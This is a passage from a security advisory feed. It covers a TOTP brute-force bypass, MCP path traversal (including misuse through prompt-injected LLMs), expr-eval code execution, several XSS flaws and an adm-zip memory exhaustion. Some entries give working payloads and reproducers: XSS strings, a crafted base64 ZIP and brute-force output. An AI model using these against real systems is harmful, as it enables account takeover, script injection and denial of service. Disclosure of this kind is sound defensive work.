[*] Step 2: Brute-forcing TOTP codes (4 workers)...
  Ranges: W0=000000-250000, W1=250000-500000, W2=500000-750000, W3=750000-1000000
  [W2]   1,100 total | 11.3 req/s | retries: 0
      &lt;snip&gt;
  [W1] 195,400 total | 11.0 req/s | retries: 0

[*] Step 3: Results
  Total attempts : 195,907
  Time elapsed   : 17769.5s (296.2min)
  Average RPS    : 11.0

[+] VALID TOTP CODE FOUND : 026961
[+] clientId              : 13951b88-03d4-4854-8a29-cd8921d73d82
[+] clientToken           : c92ef5ca-7432-44d0-8a94-56398bfe4117

[*] Step 4: Confirming access and attempting to disable 2FA...
  [+] Authenticated as : mfatest (id=3, role=1)
      passwordAttempts : 0
  [+] 2FA DISABLED. Account 'mfatest' now accessible with password alone.
</code></pre>
<p><strong>Measured observations:</strong></p>
<ul>
<li>No account lockout was observed across 195,907 failed TOTP attempts in this test against the vulnerable version.</li>
<li>The <code>clientToken</code> was exchanged for an authenticated session.</li>
<li>MFA was disabled via <code>POST /api/auth/2fa/disable</code> while the guessed TOTP code was still valid and because the attacker already knew the account password.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>An attacker who already knows valid credentials for a TOTP-enabled account with desktop sync permission can brute-force the second factor through <code>POST /api/app/sync/register</code> without triggering account lockout.</p>
<p>With <code>drift: 1</code>, 3 of 1,000,000 six-digit codes are valid per 30-second window (<code>p = 3/1,000,000</code>), giving an expected 333,333 attempts to find a valid code.</p>
<p>At 3 r/s, measured against a default single-worker deployment:</p>
<table>
<thead>
<tr>
<th>Success probability</th>
<th align="right">Attempts</th>
<th align="right">Time at 3 r/s</th>
</tr>
</thead>
<tbody><tr>
<td>50%</td>
<td align="right">231,049</td>
<td align="right">21.4 h</td>
</tr>
<tr>
<td>90%</td>
<td align="right">767,528</td>
<td align="right">71.1 h</td>
</tr>
<tr>
<td>95%</td>
<td align="right">998,577</td>
<td align="right">92.5 h</td>
</tr>
<tr>
<td>99%</td>
<td align="right">1,535,056</td>
<td align="right">142.1 h</td>
</tr>
<tr>
<td>Expected (mean)</td>
<td align="right">333,333</td>
<td align="right">30.9 h</td>
</tr>
</tbody></table>
<p>Deployments with <code>server.workers &gt; 1</code> may allow higher throughput, depending on CPU capacity and other bottlenecks. Throughput is heavily influenced by server-side password verification cost, worker count, database latency, and deployment limits, not only by the attacker's network speed.</p>
<h2 id="remediation">Remediation</h2>
<p>Add <code>&amp;&amp; success</code> to the freeze condition at <code>users-manager.service.ts</code> line 184:</p>
<pre><code class="language-typescript">// Before
if (!isAuthTwoFa &amp;&amp; configuration.auth.mfa.totp.enabled &amp;&amp; user.twoFaEnabled) {

// After
if (!isAuthTwoFa &amp;&amp; configuration.auth.mfa.totp.enabled &amp;&amp; user.twoFaEnabled &amp;&amp; success) {
</code></pre>
<p>The freeze still applies when a password succeeds but 2FA is pending, which was its intended purpose. A failed TOTP at <code>register()</code> and a failed password at <code>login</code>/<code>token</code> both fall through to the increment path, restoring lockout after 10 failures.</p>
<p>For defense-in-depth, apply an IP and/or account-based rate limiter to <code>POST /api/app/sync/register</code> and other pre-auth credential endpoints.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Sync-in/server/security/advisories/GHSA-274f-6w77-8qm9">https://github.com/Sync-in/server/security/advisories/GHSA-274f-6w77-8qm9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-58271">https://nvd.nist.gov/vuln/detail/CVE-2026-58271</a></li>
<li><a href="https://github.com/Sync-in/server/pull/228">https://github.com/Sync-in/server/pull/228</a></li>
<li><a href="https://github.com/Sync-in/server/commit/b13a4aad5c2b38fe8231a0d007cd08a086ec5bdb">https://github.com/Sync-in/server/commit/b13a4aad5c2b38fe8231a0d007cd08a086ec5bdb</a></li>
<li><a href="https://github.com/Sync-in/server/releases/tag/v2.4.0">https://github.com/Sync-in/server/releases/tag/v2.4.0</a></li>
<li><a href="https://github.com/advisories/GHSA-274f-6w77-8qm9">https://github.com/advisories/GHSA-274f-6w77-8qm9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-274f-6w77-8qm9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-22T14:44:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@roomi-fields/notebooklm-mcp] @roomi-fields/notebooklm-mcp has a path traversal in vault.batch tool that allows arbitrary file write outside intended vault directory]]></title>
        <id>https://github.com/advisories/GHSA-jjhp-8crj-mppq</id>
        <link href="https://github.com/advisories/GHSA-jjhp-8crj-mppq"/>
        <updated>2026-09-22T14:43:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>vault_batch</code> MCP tool (and the equivalent <code>POST /batch-to-vault</code> HTTP endpoint) accepted a caller-supplied <code>vault_dir</code> path that was passed directly to <code>path.resolve()</code> + <code>fs.mkdir()</code> with no containment check. A caller — or a prompt-injected LLM driving the MCP — could therefore create directories and write <code>.md</code> / <code>.json</code> answer files anywhere the server process can write.</p>
<p>The <code>slug_prefix</code> parameter had a parallel, smaller traversal vector: it was concatenated into the filename without sanitization, so a prefix containing <code>/</code> or <code>..</code> could escape the resolved vault directory through the filename component.</p>
<h2 id="impact">Impact</h2>
<p>File write (markdown + JSON sidecars) to any location writable by the server process. The written files are inert content (no code execution by themselves), but in a multi-user context — or when the MCP server is driven by an LLM that has read untrusted content (prompt injection) — this allows an attacker to plant files in sensitive locations (autostart folders, shell startup files, etc.) for downstream exploitation.</p>
<p>The vulnerability exists from <strong>v1.6.0</strong> (when the HTTP <code>/batch-to-vault</code> endpoint was introduced) and v1.7.0 (when the same logic was exposed as the <code>batch_to_vault</code> MCP tool) through <strong>v2.0.2</strong>.</p>
<h2 id="patch">Patch</h2>
<p>Fixed in <strong>v2.0.3</strong>:</p>
<ul>
<li><strong>Opt-in containment via <code>NOTEBOOKLM_VAULT_ROOT</code> env var.</strong> When set, <code>vault_dir</code> is resolved relative to that root and <code>realpath</code>-based containment is enforced. Absolute paths or <code>..</code> segments outside the root are rejected with a clear error.</li>
<li><strong><code>slug_prefix</code> is always sanitized.</strong> Path separators (<code>/</code>, <code>\</code>), <code>..</code> sequences and NUL bytes are stripped, length capped at 64 characters. This applies regardless of whether <code>NOTEBOOKLM_VAULT_ROOT</code> is set.</li>
<li>15 unit tests in <code>src/__tests__/vault-writer.test.ts</code> cover the escape vectors (absolute paths, sibling-prefix attacks, <code>..</code> traversal, NUL/separator stripping).</li>
</ul>
<h2 id="workarounds-for-users-who-cannot-upgrade">Workarounds for users who cannot upgrade</h2>
<ul>
<li>Run the MCP server under a dedicated unprivileged user with write access only to the intended vault directory.</li>
<li>Do not expose the HTTP <code>/batch-to-vault</code> endpoint beyond localhost.</li>
<li>If using an LLM that ingests untrusted content, validate any <code>vault_dir</code> arguments before forwarding them to the MCP.</li>
</ul>
<h2 id="configuration-requirement-after-upgrade-important">Configuration requirement after upgrade (important)</h2>
<p>v2.0.3 preserves the legacy unrestricted behaviour when <code>NOTEBOOKLM_VAULT_ROOT</code> is <strong>unset</strong>, to keep existing single-user local setups working. <strong>To enable containment, set <code>NOTEBOOKLM_VAULT_ROOT</code> in the server environment</strong> to a directory that should bound all vault writes.</p>
<h2 id="credit">Credit</h2>
<p>Reported by @mcfly-zzh — thanks for the careful diagnosis and follow-up verification.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/roomi-fields/notebooklm-mcp/security/advisories/GHSA-jjhp-8crj-mppq">https://github.com/roomi-fields/notebooklm-mcp/security/advisories/GHSA-jjhp-8crj-mppq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61647">https://nvd.nist.gov/vuln/detail/CVE-2026-61647</a></li>
<li><a href="https://github.com/roomi-fields/notebooklm-mcp/issues/15">https://github.com/roomi-fields/notebooklm-mcp/issues/15</a></li>
<li><a href="https://github.com/roomi-fields/notebooklm-mcp/commit/13828d9ff3933839ce14c1797d3b20a6bb7694a6">https://github.com/roomi-fields/notebooklm-mcp/commit/13828d9ff3933839ce14c1797d3b20a6bb7694a6</a></li>
<li><a href="https://github.com/roomi-fields/notebooklm-mcp/releases/tag/v2.0.3">https://github.com/roomi-fields/notebooklm-mcp/releases/tag/v2.0.3</a></li>
<li><a href="https://github.com/advisories/GHSA-jjhp-8crj-mppq">https://github.com/advisories/GHSA-jjhp-8crj-mppq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjhp-8crj-mppq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-22T14:43:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[expr-eval] expr-eval vulnerable to Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-q9v2-7m5w-4693</id>
        <link href="https://github.com/advisories/GHSA-q9v2-7m5w-4693"/>
        <updated>2026-09-22T14:40:56.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package expr-eval are vulnerable to Code Execution via the toJSFunction() API. An attacker can execute arbitrary JavaScript by supplying crafted expressions that are compiled into native code using new Function(). Because user-controlled expressions are transformed directly into executable JavaScript, attackers can escape the intended expression sandbox and run arbitrary code within the application's context.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12866">https://nvd.nist.gov/vuln/detail/CVE-2026-12866</a></li>
<li><a href="https://github.com/silentmatt/expr-eval/issues/292">https://github.com/silentmatt/expr-eval/issues/292</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-EXPREVAL-15054690">https://security.snyk.io/vuln/SNYK-JS-EXPREVAL-15054690</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-17662018">https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-17662018</a></li>
<li><a href="https://github.com/silentmatt/expr-eval/blob/master/src/expression.js#L55">https://github.com/silentmatt/expr-eval/blob/master/src/expression.js#L55</a></li>
<li><a href="https://github.com/advisories/GHSA-q9v2-7m5w-4693">https://github.com/advisories/GHSA-q9v2-7m5w-4693</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9v2-7m5w-4693</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-23T06:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[msdoc-viewer] File Viewer: DOM XSS via unsafe hyperlink schemes in the legacy DOC renderer]]></title>
        <id>https://github.com/advisories/GHSA-3753-m2x2-q623</id>
        <link href="https://github.com/advisories/GHSA-3753-m2x2-q623"/>
        <updated>2026-09-18T17:19:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Before 2.3.1, the legacy <code>.doc</code> renderer emitted document hyperlink targets after HTML escaping but without a URL-scheme allowlist. A crafted <code>.doc</code> could therefore render a live <code>javascript:</code>, <code>vbscript:</code>, <code>data:</code>, or similarly unsafe link. Script could execute in the embedding origin if a viewer clicked it.</p>
<h3 id="impact">Impact</h3>
<p>Applications rendering untrusted legacy <code>.doc</code> files with <code>@file-viewer/doc</code> or the <code>msdoc-viewer</code> compatibility package could expose their origin to attacker-controlled script after link interaction.</p>
<h3 id="fix">Fix</h3>
<p>Version 2.3.1 centralizes link handling, removes control-character and scheme confusion, blocks external document links by default, and in explicit allow mode accepts only HTTP(S), mail, telephone, safe relative URLs, and internal bookmarks. The renderer output is safe before mounting, with mount-boundary sanitization as defense in depth. The <code>msdoc-viewer</code> compatibility release containing the fix is 0.2.2.</p>
<p>Thanks to @shashank420 for responsibly reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/flyfish-dev/file-viewer/security/advisories/GHSA-3753-m2x2-q623">https://github.com/flyfish-dev/file-viewer/security/advisories/GHSA-3753-m2x2-q623</a></li>
<li><a href="https://github.com/flyfish-dev/file-viewer/commit/ef045680f8d9830a3eee9612f7df46a734361b07">https://github.com/flyfish-dev/file-viewer/commit/ef045680f8d9830a3eee9612f7df46a734361b07</a></li>
<li><a href="https://github.com/flyfish-dev/file-viewer/releases/tag/v2.3.1">https://github.com/flyfish-dev/file-viewer/releases/tag/v2.3.1</a></li>
<li><a href="https://github.com/advisories/GHSA-3753-m2x2-q623">https://github.com/advisories/GHSA-3753-m2x2-q623</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3753-m2x2-q623</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-18T17:19:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@file-viewer/doc] File Viewer: DOM XSS via unsafe hyperlink schemes in the legacy DOC renderer]]></title>
        <id>https://github.com/advisories/GHSA-3753-m2x2-q623</id>
        <link href="https://github.com/advisories/GHSA-3753-m2x2-q623"/>
        <updated>2026-09-18T17:19:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Before 2.3.1, the legacy <code>.doc</code> renderer emitted document hyperlink targets after HTML escaping but without a URL-scheme allowlist. A crafted <code>.doc</code> could therefore render a live <code>javascript:</code>, <code>vbscript:</code>, <code>data:</code>, or similarly unsafe link. Script could execute in the embedding origin if a viewer clicked it.</p>
<h3 id="impact">Impact</h3>
<p>Applications rendering untrusted legacy <code>.doc</code> files with <code>@file-viewer/doc</code> or the <code>msdoc-viewer</code> compatibility package could expose their origin to attacker-controlled script after link interaction.</p>
<h3 id="fix">Fix</h3>
<p>Version 2.3.1 centralizes link handling, removes control-character and scheme confusion, blocks external document links by default, and in explicit allow mode accepts only HTTP(S), mail, telephone, safe relative URLs, and internal bookmarks. The renderer output is safe before mounting, with mount-boundary sanitization as defense in depth. The <code>msdoc-viewer</code> compatibility release containing the fix is 0.2.2.</p>
<p>Thanks to @shashank420 for responsibly reporting this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/flyfish-dev/file-viewer/security/advisories/GHSA-3753-m2x2-q623">https://github.com/flyfish-dev/file-viewer/security/advisories/GHSA-3753-m2x2-q623</a></li>
<li><a href="https://github.com/flyfish-dev/file-viewer/commit/ef045680f8d9830a3eee9612f7df46a734361b07">https://github.com/flyfish-dev/file-viewer/commit/ef045680f8d9830a3eee9612f7df46a734361b07</a></li>
<li><a href="https://github.com/flyfish-dev/file-viewer/releases/tag/v2.3.1">https://github.com/flyfish-dev/file-viewer/releases/tag/v2.3.1</a></li>
<li><a href="https://github.com/advisories/GHSA-3753-m2x2-q623">https://github.com/advisories/GHSA-3753-m2x2-q623</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3753-m2x2-q623</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-18T17:19:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[adm-zip] adm-zip: Uncontrolled memory allocation via the declared uncompressed size (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-7q85-xj36-vmfc</id>
        <link href="https://github.com/advisories/GHSA-7q85-xj36-vmfc"/>
        <updated>2026-09-18T17:18:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>adm-zip allocates an entry's output buffer from the declared uncompressed size (central-directory <code>size</code> field) before validating it against the actual data. A tiny crafted ZIP that declares a huge uncompressed size forces a multi-gigabyte allocation from a few bytes.</p>
<h3 id="impact">Impact</h3>
<p>On adm-zip 0.5.17 (latest), Node 24, a 105-byte ZIP with one stored entry declaring size = 1,774,399,200 makes <code>new AdmZip(buf).getEntries()[0].getData()</code> commit ~1.8 GB of resident memory in ~4.4 s before throwing <code>Error: ADM-ZIP: CRC32 checksum failed</code>, roughly 16 million times the input size. Because the buffer is committed before any validation, on a memory-constrained host (containers, serverless, small VMs) the allocation OOM-kills the process before the CRC check (uncatchable), and concurrent requests can exhaust memory even on larger hosts. Any service that reads entries from untrusted ZIPs is exposed to a remote denial of service.</p>
<h3 id="steps-to-reproduce">Steps to reproduce</h3>
<p>Attachments are not supported in the advisory form, so the 105-byte PoC (sha256 <code>980d34356fbb248fe527b9d0ac3eabc5c99393a374014be6199523de16709386</code>) is inlined as base64 in this self-contained reproducer:</p>
<pre><code class="language-js">const AdmZip = require('adm-zip');
// 105-byte crafted ZIP, base64-inlined
// sha256 980d34356fbb248fe527b9d0ac3eabc5c99393a374014be6199523de16709386
const b64 = "UEsDBBQAAAAAAAAAAAAAAAAABQAAAAUAAAABAAAAYWhlbGxvUEsBAhQAFAAAAAAAAAAAAAAAAAAFAAAA4C7DaQEAAAAAAAAAAAAAAAAAAAAAAGFQSwUGAAAAAAEAAQAvAAAAJAAAAAAA";
const buf = Buffer.from(b64, "base64");          // 105 bytes
const zip = new AdmZip(buf);
zip.getEntries()[0].getData();   // commits ~1.8 GB, then throws "ADM-ZIP: CRC32 checksum failed"
</code></pre>
<p>The single entry declares uncompressed size = 1,774,399,200 with a compressed size of 5. <code>getData()</code> allocates the full declared size before the CRC check runs, so the memory is committed regardless of the (tiny) actual payload.</p>
<h3 id="root-cause">Root cause</h3>
<p><code>zipEntry.js</code> does <code>Buffer.alloc(&lt;declared uncompressed size&gt;)</code> before checking the declared size against the compressed size / available bytes.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Validate the declared uncompressed size against the compressed size and a configurable maximum before allocating (yauzl, for example, requires the caller to bound this); reject or stream when the declared size is implausible relative to the input. Happy to send a patch.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cthackers/adm-zip/security/advisories/GHSA-7q85-xj36-vmfc">https://github.com/cthackers/adm-zip/security/advisories/GHSA-7q85-xj36-vmfc</a></li>
<li><a href="https://github.com/cthackers/adm-zip/commit/491600683dacb6cb9fe0718a0eeb9cb5eb49afa6">https://github.com/cthackers/adm-zip/commit/491600683dacb6cb9fe0718a0eeb9cb5eb49afa6</a></li>
<li><a href="https://github.com/cthackers/adm-zip/releases/tag/v0.6.1">https://github.com/cthackers/adm-zip/releases/tag/v0.6.1</a></li>
<li><a href="https://github.com/advisories/GHSA-7q85-xj36-vmfc">https://github.com/advisories/GHSA-7q85-xj36-vmfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7q85-xj36-vmfc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-18T17:18:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[md-editor-v3] md-editor-v3: XSS via fenced-code language rendering bypass]]></title>
        <id>https://github.com/advisories/GHSA-3rm2-h79c-8qw6</id>
        <link href="https://github.com/advisories/GHSA-3rm2-h79c-8qw6"/>
        <updated>2026-09-18T17:17:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>MdPreview</code> interpolates a fenced-code language into HTML attributes without escaping it. A crafted info string therefore executes JavaScript even when the shipped <code>XSSPlugin</code> is enabled.</p>
<h3 id="details">Details</h3>
<p><code>useMarkdownIt()</code> (<code>packages/MdEditor/layouts/Content/composition/useMarkdownIt.ts:206</code>) registers a <code>highlight</code> callback whose final return inserts <code>language</code> into both <code>class="language-${language}"</code> and an unquoted <code>language=${language}</code> attribute without escaping. Both highlighting paths reach this return. <code>XSSPlugin()</code> filters only existing <code>html_block</code> and <code>html_inline</code> tokens before rendering, so it cannot inspect this renderer-generated HTML.</p>
<h3 id="poc">PoC</h3>
<p>The Vue application enables the shipped <code>XSSPlugin</code> and renders attacker-controlled Markdown. <code>noHighlight: true</code> only makes reproduction deterministic; the default highlighting path reaches the same unsafe return. Use this as <code>src/main.js</code>:</p>
<pre><code class="language-js">import { createApp, h } from 'vue';
import { MdPreview, XSSPlugin, config } from 'md-editor-v3';

config({ markdownItPlugins: p =&gt; [...p, { type: 'xss', plugin: XSSPlugin, options: {} }] });
const markdown = '```x"&gt;&lt;details/open/ontoggle=alert(document.domain)&gt;\nSAFE\n```';
createApp({ render: () =&gt; h(MdPreview,
  { editorId: 'poc', modelValue: markdown, noHighlight: true })
}).mount('#app');
</code></pre>
<p>Create and run the app, replacing <code>src/main.js</code> when indicated:</p>
<pre><code class="language-sh">npm create vite@latest poc -- --template vue
cd poc
npm install
npm install md-editor-v3@6.5.3
# Replace src/main.js with the code above.
npm run dev
</code></pre>
<p>Opening the displayed URL automatically shows the application hostname in an alert.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can supply Markdown can execute JavaScript in the application origin when a victim renders it. If the host stores that Markdown, this becomes stored XSS.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Escape <code>language</code> with <code>md.utils.escapeHtml</code> before interpolation and quote the <code>language</code> attribute. Add this payload and the raw control as regression tests with <code>XSSPlugin</code> enabled.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/imzbf/md-editor-v3/security/advisories/GHSA-3rm2-h79c-8qw6">https://github.com/imzbf/md-editor-v3/security/advisories/GHSA-3rm2-h79c-8qw6</a></li>
<li><a href="https://github.com/imzbf/md-editor-v3/commit/2c07360420e74087f5bc63032ab155d93e0a0b10">https://github.com/imzbf/md-editor-v3/commit/2c07360420e74087f5bc63032ab155d93e0a0b10</a></li>
<li><a href="https://github.com/imzbf/md-editor-v3/releases/tag/v6.5.4">https://github.com/imzbf/md-editor-v3/releases/tag/v6.5.4</a></li>
<li><a href="https://github.com/advisories/GHSA-3rm2-h79c-8qw6">https://github.com/advisories/GHSA-3rm2-h79c-8qw6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3rm2-h79c-8qw6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-18T17:17:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[paella-core] Opencast: Stored XSS in Paella player via WebVTT/DFXP caption cue text]]></title>
        <id>https://github.com/advisories/GHSA-m6c8-jcw2-5r25</id>
        <link href="https://github.com/advisories/GHSA-m6c8-jcw2-5r25"/>
        <updated>2026-09-18T13:12:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The Opencast Paella player renders caption cue text into <code>innerHTML</code> without escaping. The captions canvas clears <code>_captionsContainer.innerHTML</code> and then appends each active cue with <code>_captionsContainer.innerHTML += cue</code>, so HTML inside a WebVTT or DFXP cue becomes live DOM and executes in the Opencast origin.</p>
<p>The caption track is read from any media package element with a <code>captions/*</code> flavor and is served, with the player manifest, to anonymous viewers through <code>/search/episode.json</code>. The caption plugins that consume it are enabled in the default player configuration, the "Subtitles" upload that produces a <code>captions/source</code> track is active by default, and no caption processing step escapes the cue text.</p>
<p>A user who can upload a subtitle to an event and publish it stores the payload in the published caption file. Any viewer who opens the event and turns captions on runs the script.</p>
<p>Result: a non-admin content author stores JavaScript in a subtitle cue that executes in the browser session of every viewer who enables captions on that event, including anonymous viewers and authenticated staff.</p>
<h2 id="affected">Affected</h2>
<p>opencast/opencast, <code>engage-paella-player</code> module. Supported release lines 19.x and 20.x are affected (and 18.x). Live-confirmed on 18.8 (Paella 7, paella-core 1.50.2) and 20.0 (Paella 8, paella-core 1.50.4); 19.5 ships the code-identical caption path (paella-core 1.50.4, same <code>EpisodeConversor</code> and default plugin config as 20.0). The captions canvas uses the same <code>innerHTML += cue</code> sink across these versions.
Default configuration: the WebVTT and DFXP caption plugins are <code>enabled: true</code> in <code>etc/ui-config/mh_default_org/paella7/config.json</code>, the "Subtitles" upload option (<code>captions/source</code>, <code>.vtt</code>) is active in <code>etc/listproviders/event.upload.asset.options.properties</code>, and the <code>fast</code> workflow publishes <code>captions/*</code> to the engage player.
Condition: an event with a caption track published to the engage player. No non-default flag required.</p>
<h2 id="root-cause">Root cause</h2>
<p>The captions canvas appends each cue to <code>_captionsContainer.innerHTML</code> in the bundled paella-core (served at <code>/paellaN/ui/paella-player.js</code> / the 20.x core chunk), so markup in a cue becomes live DOM. The caption entry is built from any media package element whose flavor matches <code>captions/*</code> at <code>modules/engage-paella-player-7/src/js/EpisodeConversor.js:392</code>, and <code>/search/episode.json</code> serves the manifest and the caption file to anonymous clients. The WebVTT and DFXP plugins that consume it are enabled by default at <code>etc/ui-config/mh_default_org/paella7/config.json:571</code> and <code>:574</code>. The cue text is not HTML-escaped before assignment to <code>innerHTML</code>, and <code>partial-process-uploaded-captions</code> only cuts and tags the file, it never sanitizes it. Opencast sets neither a Content-Security-Policy nor an X-Content-Type-Options header, so the injected script runs without restriction.</p>
<h2 id="reproduction">Reproduction</h2>
<p>Default config, default caption plugins enabled, a non-admin user with <code>ROLE_API_EVENTS_CREATE</code>, <code>ROLE_API_EVENTS_TRACK_EDIT</code>, and <code>ROLE_UI_TASKS_CREATE</code> (no <code>ROLE_ADMIN</code>).</p>
<ol>
<li>As the non-admin user, create an event, then upload a WebVTT subtitle as <code>captions/source</code> whose cue text is an XSS payload, and publish the event.</li>
</ol>
<pre><code>WEBVTT

00:00:00.000 --&gt; 00:00:30.000
&lt;img src=x onerror=document.title=window.__xss=document.domain&gt;
</code></pre>
<ol start="2">
<li>The anonymous search manifest then exposes the caption and serves the cue raw.</li>
</ol>
<pre><code>GET /search/episode.json?id=&lt;event&gt;
"type":"captions/source", "url":".../static/.../x.vtt"
GET .../static/.../x.vtt  -&gt;  cue text returned verbatim
</code></pre>
<ol start="3">
<li>Open the event in the player as an anonymous viewer, open the captions menu, and select the track; the cue is written to <code>innerHTML</code> and the <code>onerror</code> handler runs.</li>
</ol>
<p>Live-verified: on Opencast 18.8 (build 8705223) in Chrome, a non-admin author published the subtitle and an anonymous viewer enabled captions, rendering the cue as a live <code>&lt;img&gt;</code> node and setting <code>window.__xss</code> and <code>document.title</code> to <code>document.domain</code>. On Opencast 20.0 (build d919405, Paella 8), the served core bundle contains the identical <code>innerHTML += cue</code> sink and the player loads the cue raw; the sink executes JavaScript in the engage origin when fed the player's own published caption file.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>JavaScript execution in the Opencast origin in the session of any viewer who enables captions on the event.</li>
<li>Anonymous viewers and authenticated staff are equally affected; an instructor or admin viewer exposes that session context to the script.</li>
<li>Session and CSRF-token theft, actions performed as the victim against the Opencast REST API.</li>
<li>Stored by a non-admin content author, triggered by viewing with captions on, no attacker authentication at view time.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Jan Kahmen, <a href="https://www.turingpoint.de">turingpoint</a> (<a href="mailto:jan@turingpoint.de">jan@turingpoint.de</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/opencast/opencast/security/advisories/GHSA-m6c8-jcw2-5r25">https://github.com/opencast/opencast/security/advisories/GHSA-m6c8-jcw2-5r25</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-77615">https://nvd.nist.gov/vuln/detail/CVE-2026-77615</a></li>
<li><a href="https://github.com/opencast/opencast/pull/7736">https://github.com/opencast/opencast/pull/7736</a></li>
<li><a href="https://github.com/opencast/opencast/commit/701682c635f668228c3e8fb7b4564b3294788e40">https://github.com/opencast/opencast/commit/701682c635f668228c3e8fb7b4564b3294788e40</a></li>
<li><a href="https://github.com/polimediaupv/paella-core/commit/94a36490808ac5a1f60a0745d71ec9253f6d206b">https://github.com/polimediaupv/paella-core/commit/94a36490808ac5a1f60a0745d71ec9253f6d206b</a></li>
<li><a href="https://github.com/polimediaupv/paella-core/commit/9b2f14ec4cf55efaf4c045c77a5ed8f5ec559ab4">https://github.com/polimediaupv/paella-core/commit/9b2f14ec4cf55efaf4c045c77a5ed8f5ec559ab4</a></li>
<li><a href="https://github.com/polimediaupv/paella-player/commit/6fe4af7306044198c8e91e2e7f4128428b83cf03">https://github.com/polimediaupv/paella-player/commit/6fe4af7306044198c8e91e2e7f4128428b83cf03</a></li>
<li><a href="https://github.com/opencast/opencast/releases/tag/19.7">https://github.com/opencast/opencast/releases/tag/19.7</a></li>
<li><a href="https://github.com/opencast/opencast/releases/tag/20.2">https://github.com/opencast/opencast/releases/tag/20.2</a></li>
<li><a href="https://github.com/polimediaupv/paella-player/blob/a1b6c42467938a00a4b4d0b8c68435cd4f9d2a16/repos/paella-core/CHANGELOG.md?plain=1#L21">https://github.com/polimediaupv/paella-player/blob/a1b6c42467938a00a4b4d0b8c68435cd4f9d2a16/repos/paella-core/CHANGELOG.md?plain=1#L21</a></li>
<li><a href="https://github.com/advisories/GHSA-m6c8-jcw2-5r25">https://github.com/advisories/GHSA-m6c8-jcw2-5r25</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m6c8-jcw2-5r25</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-18T13:11:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@platejs/core] @platejs/core HTML deserialization can trigger browser behavior during parsing]]></title>
        <id>https://github.com/advisories/GHSA-qrfj-mgw8-j9c6</id>
        <link href="https://github.com/advisories/GHSA-qrfj-mgw8-j9c6"/>
        <updated>2026-09-17T20:32:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>HTML strings passed to Plate's core deserialization APIs were parsed in the active document. Certain HTML attributes could therefore trigger browser behavior during parsing, before the content was converted into editor nodes.</p>
<p>Applications that deserialize HTML from untrusted or cross-user sources may be affected.</p>
<h3 id="impact">Impact</h3>
